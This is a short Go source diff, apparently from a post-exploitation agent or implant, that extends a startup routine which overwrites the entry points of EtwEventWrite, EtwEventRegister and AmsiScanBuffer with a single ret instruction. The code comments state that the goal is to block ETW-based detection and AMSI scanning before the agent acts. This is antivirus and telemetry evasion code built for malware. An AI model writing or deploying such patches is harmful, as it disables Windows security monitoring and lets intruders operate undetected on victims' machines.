@@ -12,12 +12,13 @@ var (
 	procVirtualProtAP = kernel32AP.NewProc("VirtualProtect")
 )
 
-// autoStartupPatch patches EtwEventWrite and AmsiScanBuffer at startup
-// with a single 0xC3 (ret) instruction, causing them to return immediately.
+// autoStartupPatch patches ETW and AMSI functions at startup with a single
+// 0xC3 (ret) instruction, causing them to return immediately.
 // This prevents ETW-based detection and AMSI scanning before any agent activity.
 func autoStartupPatch() {
 	// Patch ETW first — ntdll.dll is always loaded
 	patchFunctionEntry("ntdll.dll", "EtwEventWrite")
+	patchFunctionEntry("ntdll.dll", "EtwEventRegister")
 	// Patch AMSI — amsi.dll may not be loaded yet, but will be when CLR loads
 	patchFunctionEntry("amsi.dll", "AmsiScanBuffer")
 }
